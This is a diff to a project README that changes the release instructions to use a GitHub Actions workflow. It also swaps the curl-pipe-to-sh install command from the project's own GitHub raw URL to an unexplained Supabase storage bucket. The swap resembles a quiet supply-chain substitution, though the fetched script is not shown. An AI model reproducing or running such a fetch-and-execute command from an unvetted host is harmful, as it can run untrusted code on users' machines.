@@ -51,21 +51,22 @@ Bumping the engine is therefore deliberate: update `version`, update every
 
 ## Cutting a release
 
-Push a tag:
-
-```bash
-git tag v0.1.0 && git push origin v0.1.0
-```
+From the Actions tab, run the **Release** workflow: "Run workflow", type a
+version (`0.2.0`, no leading `v`), leave `dry_run` unchecked. The tag job
+creates and pushes `v0.2.0` itself, so nobody needs push access from a local
+clone — see [ADR 0010](../docs/decisions/0010-release-from-the-actions-ui.md).
+Pushing a tag by hand (`git tag v0.2.0 && git push origin v0.2.0`) still works
+identically; it's the same workflow either way.
 
 The workflow builds all five platforms, verifies the engine checksum for each,
 checks that the shipped Linux binary runs and prints its copyright notice, then
-publishes the archives with checksums. `workflow_dispatch` with `dry_run` does
-everything except publish.
+publishes the archives with checksums. Leave `dry_run` checked (the default)
+to do everything except tag and publish.
 
 ## Installing
 
 ```sh
-curl -fsSL https://raw.githubusercontent.com/pra2107tham/shimmr/main/install.sh | sh
+curl -fsSL https://fpxntzwkiepnwsazmaxf.supabase.co/storage/v1/object/public/releases/install.sh | sh
 ```
 
 The installer verifies the archive against its published checksum and **refuses
